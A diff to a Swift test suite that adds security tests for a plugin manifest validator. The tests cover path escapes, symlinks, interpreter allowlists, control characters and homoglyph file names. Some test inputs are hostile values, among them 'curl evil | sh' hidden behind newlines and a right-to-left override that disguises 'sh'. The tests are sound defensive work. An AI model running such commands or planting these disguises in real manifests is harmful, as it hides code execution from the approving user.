@@ -443,7 +443,7 @@ struct PluginManifestTests {
         let directory = try makeDirectory()
         defer { try? FileManager.default.removeItem(at: directory) }
         let manifest = try decode(manifestJSON(execPath: "/usr/bin/env", execArgs: #"["node", "x.js"]"#))
-        #expect(throws: PluginManifest.ValidationError.execResolvesThroughPATH("/usr/bin/env")) {
+        #expect(throws: PluginManifest.ValidationError.execNotAllowlisted("/usr/bin/env")) {
             try manifest.validated(builtInIDs: [], pluginDirectory: directory)
         }
     }
@@ -503,6 +503,104 @@ struct PluginManifestTests {
         let manifest = try decode(manifestJSON(
             signInRun: #""signIn": {"guidance": "g", "run": ["/bin/sh", "/Users/me/login.sh"]},"#))
         #expect(throws: PluginManifest.ValidationError.argumentOutsidePluginDirectory("/Users/me/login.sh")) {
+            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
+        }
+    }
+
+    // MARK: - Security review round 2
+
+    @Test func rejectsARelativeArgumentThatEscapesWithDotDot() throws {
+        let directory = try makeDirectory()
+        defer { try? FileManager.default.removeItem(at: directory) }
+        // The child runs with the plugin directory as cwd, so `../run.sh` is
+        // a file in the plugins root — never scanned, never hashed.
+        let manifest = try decode(manifestJSON(execArgs: #"["../run.sh"]"#))
+        #expect(throws: PluginManifest.ValidationError.argumentOutsidePluginDirectory("../run.sh")) {
+            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
+        }
+    }
+
+    @Test func rejectsARelativeArgumentThroughASymlinkThatEscapes() throws {
+        let root = try makeDirectory()
+        defer { try? FileManager.default.removeItem(at: root) }
+        let outside = root.appendingPathComponent("elsewhere", isDirectory: true)
+        let directory = root.appendingPathComponent("plugin", isDirectory: true)
+        try FileManager.default.createDirectory(at: outside, withIntermediateDirectories: true)
+        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
+        try FileManager.default.createSymbolicLink(
+            at: directory.appendingPathComponent("lib"), withDestinationURL: outside)
+        let manifest = try decode(manifestJSON(execArgs: #"["lib/run.sh"]"#))
+        #expect(throws: PluginManifest.ValidationError.argumentOutsidePluginDirectory("lib/run.sh")) {
+            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
+        }
+    }
+
+    @Test func rejectsARootOwnedExecOutsideTheInterpreterAllowlist() throws {
+        let directory = try makeDirectory()
+        defer { try? FileManager.default.removeItem(at: directory) }
+        // zsh sources ~/.zshenv for a script, and HOME is in the child's
+        // environment: user-writable code the hash never sees.
+        let manifest = try decode(manifestJSON(execPath: "/bin/zsh"))
+        #expect(throws: PluginManifest.ValidationError.execNotAllowlisted("/bin/zsh")) {
+            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
+        }
+    }
+
+    @Test func rejectsASignInExecutableOutsideTheInterpreterAllowlist() throws {
+        let directory = try makeDirectory()
+        defer { try? FileManager.default.removeItem(at: directory) }
+        let manifest = try decode(manifestJSON(
+            signInRun: #""signIn": {"guidance": "g", "run": ["/usr/bin/python3", "login.py"]},"#))
+        #expect(throws: PluginManifest.ValidationError.signInNotAllowlisted("/usr/bin/python3")) {
+            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
+        }
+    }
+
+    @Test func rejectsAnArgumentWithAControlOrFormatCharacter() throws {
+        let directory = try makeDirectory()
+        defer { try? FileManager.default.removeItem(at: directory) }
+        // A right-to-left override reverses what the approval row prints;
+        // a newline pushes the rest of the command out of the line the
+        // user reads. Both are refused before anything is shown.
+        let override = "echo \u{202E}hs | live"
+        let overriding = try decode(manifestJSON(execArgs: "[\"-c\", \"\(override)\"]"))
+        #expect(throws: PluginManifest.ValidationError.malformedArgument(override)) {
+            try overriding.validated(builtInIDs: [], pluginDirectory: directory)
+        }
+        let breaking = try decode(manifestJSON(execArgs: #"["-c", "echo ok\n\n\ncurl evil | sh"]"#))
+        #expect(throws: PluginManifest.ValidationError.malformedArgument("echo ok\n\n\ncurl evil | sh")) {
+            try breaking.validated(builtInIDs: [], pluginDirectory: directory)
+        }
+    }
+
+    @Test func rejectsASignInArgumentWithAControlCharacter() throws {
+        let directory = try makeDirectory()
+        defer { try? FileManager.default.removeItem(at: directory) }
+        let manifest = try decode(manifestJSON(
+            signInRun: #""signIn": {"guidance": "g", "run": ["/bin/sh", "-c", "a\tb"]},"#))
+        #expect(throws: PluginManifest.ValidationError.malformedArgument("a\tb")) {
+            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
+        }
+    }
+
+    @Test func rejectsOpenAsTheExec() throws {
+        let directory = try makeDirectory()
+        defer { try? FileManager.default.removeItem(at: directory) }
+        // `open -a Helper` launches whatever LaunchServices has under that
+        // name, which the user's own processes can change after approval.
+        let manifest = try decode(manifestJSON(execPath: "/usr/bin/open", execArgs: #"["-a", "Helper"]"#))
+        #expect(throws: PluginManifest.ValidationError.execNotAllowlisted("/usr/bin/open")) {
+            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
+        }
+    }
+
+    @Test func rejectsANonASCIIArgument() throws {
+        let directory = try makeDirectory()
+        defer { try? FileManager.default.removeItem(at: directory) }
+        // A Cyrillic р: `рun.sh` prints as `run.sh`, and the user who opens
+        // the folder to read `run.sh` reads the wrong file.
+        let manifest = try decode(manifestJSON(execArgs: #"["\#u{0440}un.sh"]"#))
+        #expect(throws: PluginManifest.ValidationError.malformedArgument("\u{0440}un.sh")) {
             try manifest.validated(builtInIDs: [], pluginDirectory: directory)
         }
     }
